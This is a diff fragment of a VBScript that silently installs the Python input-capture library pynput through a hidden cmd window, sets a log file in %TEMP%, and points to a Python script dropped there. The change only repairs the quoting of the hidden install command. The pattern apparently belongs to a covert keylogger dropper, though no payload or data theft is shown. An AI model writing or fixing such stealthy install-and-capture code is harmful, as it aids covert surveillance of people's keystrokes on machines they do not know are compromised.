@@ -19,7 +19,7 @@ tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
 logFile = tempPath & "\log.txt"
 
 ' Install pynput in the background
-objShell.Run "cmd /c """%USERPROFILE%\AppData\Local\Programs\Python\Python313\python.exe" -m pip install pynput""", 0, True
+objShell.Run "cmd /c " & Chr(34) & "%USERPROFILE%\AppData\Local\Programs\Python\Python313\python.exe" & Chr(34) & " -m pip install pynput", 0, True
 
 ' Define the path to the Python script in the TEMP directory
 pythonScript = tempPath & "\a.py"
